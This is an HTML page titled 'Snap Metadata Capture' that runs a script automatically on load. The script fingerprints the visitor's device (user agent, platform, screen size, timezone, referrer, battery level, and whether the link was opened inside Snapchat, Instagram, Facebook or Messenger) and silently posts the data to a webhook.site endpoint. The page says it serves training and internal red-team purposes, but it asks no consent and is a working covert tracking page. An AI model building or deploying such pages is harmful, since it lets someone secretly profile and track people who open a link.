<!DOCTYPE html>
<html>
<head>
  <title>Snap Metadata Capture</title>
  <script>
    async function collectData() {
      let batteryLevel = "Unknown";
      try {
        const battery = await navigator.getBattery();
        batteryLevel = battery.level * 100 + "%";
      } catch (e) {}

      const data = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: {
          width: screen.width,
          height: screen.height
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        touchSupport: 'ontouchstart' in window,
        referrer: document.referrer,
        browserApp: detectAppBrowser(navigator.userAgent),
        battery: batteryLevel,
        timestamp: new Date().toISOString()
      };

      fetch("https://webhook.site/f7ea80c0-5ec7-4832-80e5-3967fa479acf", {
        method: "POST",
        body: JSON.stringify(data),
        headers: {
          "Content-Type": "application/json"
        }
      });
    }

    function detectAppBrowser(ua) {
      if (ua.includes("Snapchat")) return "Snapchat";
      if (ua.includes("Instagram")) return "Instagram";
      if (ua.includes("FBAN") || ua.includes("FBAV")) return "Facebook";
      if (ua.includes("Messenger")) return "Messenger";
      return "Standard Browser or Unknown";
    }

    window.onload = collectData;
  </script>
</head>
<body>
  <h1>Testing Environment</h1>
  <p>This page collects environment metadata for training and internal red team purposes.</p>
</body>
</html>
